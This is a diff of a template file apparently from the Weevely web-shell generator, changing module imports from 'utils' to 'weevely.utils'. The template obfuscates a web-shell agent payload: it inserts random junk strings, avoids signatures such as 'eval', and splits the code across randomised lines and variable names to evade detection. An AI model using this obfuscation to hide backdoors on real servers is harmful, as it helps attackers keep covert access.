@@ -3,21 +3,21 @@ import random
 import itertools
 import string
 import re
-import shlex 
-import utils
+import shlex
+import weevely
 %><%
 
 # Does not include \ to avoid escaping termination quotes
 def find_substr_not_in_str(mainstr, characters = string.ascii_letters + string.digits + '!"#$%&()*+,-./:;<=>?@[]^_`{|}~'):
 	while True:
-		substr = utils.strings.randstr(2, False, characters)
+		substr = weevely.utils.strings.randstr(2, False, characters)
 		if not substr in mainstr:
 			return substr
 
 def obfuscate(payload, obf, division, dangerous):
 	while True:
 
-		polluted = obf.join(list(utils.strings.divide(payload, 0, division, len(payload)//division)))
+		polluted = obf.join(list(weevely.utils.strings.divide(payload, 0, division, len(payload)//division)))
 
 		found = False
 		for dang in dangerous:
@@ -35,7 +35,7 @@ obfuscated_agent = obfuscate(agent_minified, obfuscation_agent, 6, (b'eval', b'b
 
 agent_splitted_line_number = random.randint(5,8)
 
-agent_splitted = list(utils.strings.divide(obfuscated_agent, len(obfuscated_agent)//agent_splitted_line_number-random.randint(0,5), len(obfuscated_agent)//agent_splitted_line_number, agent_splitted_line_number))
+agent_splitted = list(weevely.utils.strings.divide(obfuscated_agent, len(obfuscated_agent)//agent_splitted_line_number-random.randint(0,5), len(obfuscated_agent)//agent_splitted_line_number, agent_splitted_line_number))
 
 agent_variables = list(string.ascii_letters[:])
 random.shuffle(agent_variables)
